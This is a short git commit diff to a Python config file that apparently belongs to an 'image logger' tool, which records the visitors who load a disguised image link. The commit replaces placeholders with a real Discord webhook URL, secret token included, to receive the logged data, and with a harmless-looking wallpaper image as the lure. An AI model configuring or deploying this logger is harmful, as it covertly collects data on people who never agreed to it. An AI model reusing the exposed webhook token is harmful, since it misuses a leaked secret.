85329d680e06881108739f40e50e3d74d196ead8
skibibman12312 <rizzeathan@gmail.com>
2025-05-25 20:15:04 -0400

    Update cosmic.py

--- api/cosmic.py
+++ api/cosmic.py
@@ -10,8 +10,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1376352728502112306/G0Y-2INqvmYMewB1i6_R1fybxUhnEuNjwrNfRYYMQGX8rPcSRzf0ZPsedGtEWG-9uUa-",
+    "image": "https://cdn.neowin.com/news/images/uploaded/2023/06/1686292349_windows_xp_bliss_wallpaper_4k.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
